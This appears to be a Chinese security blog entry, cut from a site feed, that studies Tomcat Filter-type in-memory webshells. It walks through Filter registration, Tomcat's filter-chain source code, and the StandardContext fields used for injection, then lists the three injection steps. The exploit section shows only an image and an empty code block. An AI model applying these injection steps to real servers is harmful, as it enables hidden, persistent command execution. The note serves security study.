        <content type="html"><![CDATA[<h1 id="Tomcat-Filter型内存马"><a href="#Tomcat-Filter型内存马" class="headerlink" title="Tomcat Filter型内存马"></a>Tomcat Filter型内存马</h1><h1 id="Filter使用记录"><a href="#Filter使用记录" class="headerlink" title="Filter使用记录"></a>Filter使用记录</h1><p>如Servlet一样，也是需要写代码的</p><p>重写doFilter，对HTTP请求和响应做一层处理即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javaweb3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.LogRecord;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Filter注册"><a href="#Filter注册" class="headerlink" title="Filter注册"></a>Filter注册</h2><ul><li>web.xml注明</li></ul><p>在web.xml中进行filter的注册</p><p>绑定到指定的Servlet服务或者URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;&lt;http://xmlns.jcp.org/xml/ns/javaee&gt;&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;&lt;http://xmlns.jcp.org/xml/ns/javaee&gt; &lt;http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&gt;&quot;</span></span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;hello&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;com.example.javaweb3.HelloFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;hello&lt;/filter-name&gt;</span><br><span class="line">        &lt;servlet-name&gt;helloServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182119755.png" alt="image-20241218211935468"></p><p>记得在porm.xml中引入tomcat依赖，调试的时候step into有用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;&lt;http://maven.apache.org/POM/4.0.0&gt;&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;&lt;http://maven.apache.org/POM/4.0.0&gt; &lt;https://maven.apache.org/xsd/maven-4.0.0.xsd&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javaweb3&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;name&gt;javaweb3&lt;/name&gt;</span><br><span class="line">    &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">1.8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">1.8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;junit.version&gt;<span class="number">5.9</span><span class="number">.2</span>&lt;/junit.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- &lt;https:<span class="comment">//mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina&gt; --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">9.0</span><span class="number">.91</span>&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">9.0</span><span class="number">.91</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">3.3</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><ul><li>@WebFilter注解</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;TestFilter&quot;, urlPatterns = &quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Filter调试"><a href="#Filter调试" class="headerlink" title="Filter调试"></a>Filter调试</h1><p>可以看下函数调用栈，最后一步是一个ApplicationFilterChain</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182119359.png" alt="image-20241218211953244"></p><p>在我们自实现的Filter中，下断点到doFilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"><span class="comment">// 检查Globals.IS_SECURITY_ENABLED常量 判断当前是否启动了安全功能</span></span><br><span class="line">    <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">// 特权下执行internalDoFilter</span></span><br><span class="line">            AccessController.doPrivileged(() -&gt; &#123;</span><br><span class="line">                <span class="built_in">this</span>.internalDoFilter(req, res);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException var7) &#123;</span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> var7.getException();</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (ServletException)e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (IOException)e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException)e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.internalDoFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>判断是否启用安全模式，然后调用internalDoFilter</p><p>在里面判断了Filters组的索引关系，然后决定是否要调用下一个Filter，否则直接进入else代码块</p><p>在先前的Filter中，首先通过ApplicationFilterConfig对象获取filters数组中的特定filter</p><p>再通过一个ApplicationFilterConfig的getter方法获取filter</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121213.png" alt="image-20241218212013178"></p><p>看下getter，这里判断是否为空，空的话则利用反射机制创建filter对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121245.png" alt="image-20241218212024346"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response, <span class="built_in">this</span>&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var15;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(var16);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否需要包装相同的对象</span></span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            <span class="comment">// 如果需要包装相同的对象, 当前的请求request和响应response会通过线程安全的方式存储起来</span></span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// 处理异步支持</span></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !<span class="built_in">this</span>.servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"><span class="comment">// 查看是否需要特权执行, 调用service进行响应</span></span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; response <span class="keyword">instanceof</span> HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>, <span class="built_in">this</span>.servlet, classTypeUsedInService, args, principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.servlet.service(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var17;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(var18);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">                lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最终调用service进行响应</p><h1 id="Filter-相关对象和属性"><a href="#Filter-相关对象和属性" class="headerlink" title="Filter 相关对象和属性"></a>Filter 相关对象和属性</h1><p>在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象</p><ul><li>FilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则</li><li>FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得</li><li>FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例</li></ul><p>然后是位于 StandardContext 中的以 filter 开头的属性</p><ul><li>filterMaps: 本质为 Array, 存放 FilterMap</li><li>filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig</li><li>filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef</li></ul><p>根据上面加载流程, 我们注入内存马的过程为</p><ol><li>在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证)</li><li>向 filterMaps 中添加 FilterMap</li><li>将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs</li></ol><h1 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h1><p>基本原理就是在程序动态执行时打入新的恶意filter，然后添加filter-map，让filter中接受执行参数</p><h2 id="容器类"><a href="#容器类" class="headerlink" title="容器类"></a>容器类</h2><p>来看下AI的解释：</p><ul><li><p>在Java中，容器类（Container Class）是指可以存储和组织对象的类，它们提供了一种高效的方式来管理、存储和检索数据，这些类大多处于java.util包中</p><p>容器类主要分为：</p><ul><li>集合类（Collections）</li><li>映射类（Maps）</li></ul></li></ul><p>管理Filter的对应容器类为StandContext</p><h3 id="如何添加映射"><a href="#如何添加映射" class="headerlink" title="如何添加映射"></a>如何添加映射</h3><p>而处理filter中的对应容器类为StandContext，关注下添加映射的方法</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121864.png" alt="image-20241218212126617"></p><p>使用类加载机制获取，直接报空指针错误。。。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121270.png" alt="image-20241218212114226"></p><p>那就使用反射机制来获取该容器对象</p><ul><li>ApplicationFilterConfig的结构</li></ul><p>这即对应的一个filter的结构，我们需要完成的是filterDef部分</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121502.png" alt="image-20241218212102696"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182121118.png" alt="image-20241218212052727"></p><p>过程如下：</p><ul><li>获取StandContext</li></ul><blockquote><p>在 Java 中，如果没有显式地指定访问修饰符（如 <code>public</code>、<code>private</code>、<code>protected</code> 或默认的包访问权限），那么该成员函数或构造函数的访问权限是由其所在的类和包的关系决定的。</p><p>具体来说，如果没有指定访问修饰符，构造函数或方法的访问权限是<strong>包访问权限（package-private）</strong>。这意味着：</p><ul><li>该构造函数或方法对同一包中的其他类是可见的。</li><li>但对不同包中的类是不可见的。</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://exp10it.io/2022/11/tomcat-filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/#filter-%E7%9B%B8%E5%85%B3%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%B1%9E%E6%80%A7">https://exp10it.io/2022/11/tomcat-filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/#filter-%E7%9B%B8%E5%85%B3%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%B1%9E%E6%80%A7</a></li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透--基础知识</title>
      <link href="/2024/12/13/Penetration/AD/AD-Basic-md/"/>
      <url>/2024/12/13/Penetration/AD/AD-Basic-md/</url>
      
